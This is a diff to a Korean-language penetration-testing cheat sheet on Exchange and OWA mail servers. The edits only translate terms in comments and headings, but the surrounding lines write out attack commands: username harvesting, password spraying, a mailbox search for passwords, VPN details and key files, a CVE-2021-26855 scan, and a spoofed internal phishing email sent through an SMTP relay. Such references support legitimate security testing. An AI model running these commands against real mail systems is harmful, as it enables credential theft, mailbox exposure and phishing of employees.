@@ -104,14 +104,14 @@ curl -s https://autodiscover.target.com/autodiscover/autodiscover.xml
 ### 사용자 / credential 공격
 
 ```bash
-# MailSniper - 사용자 열거, 패스워드 스프레이, 메일 검색
+# MailSniper - 사용자 열거, password 스프레이, 메일 검색
 # 사용자 존재 유무 (timing-based)
 Invoke-UsernameHarvestOWA -ExchHostname mail.target.com -UserList users.txt -OutFile valid.txt
 
-# OWA 패스워드 스프레이
+# OWA password 스프레이
 Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList valid.txt -Password 'Spring2026!'
 
-# EWS 메일박스 덤프
+# EWS 메일박스 dump
 Invoke-GlobalMailSearch -ImpersonationAccount admin -ExchHostname mail.target.com -Terms ("password","vpn","*.pem")
 
 # o365spray - Office 365 사용자 열거 / 스프레이
@@ -135,12 +135,12 @@ nmap -p 443 --script http-vuln-cve2021-26855 TARGET
 
 ---
 
-## 내부 릴레이 / 피싱
+## 내부 relay / 피싱
 
 내부 네트워크 / 침투 후 신뢰된 메일 서버로 내부 피싱 발송.
 
 ```bash
-# 신뢰된 내부 SMTP 릴레이 (인증 없이 허용되는 내부 범위가 많음)
+# 신뢰된 내부 SMTP relay (인증 없이 허용되는 내부 범위가 많음)
 swaks --to finance@target.com --from helpdesk@target.com \
   --server internal-mail.target.local \
   --header "Subject: [Urgent] Password reset required" \
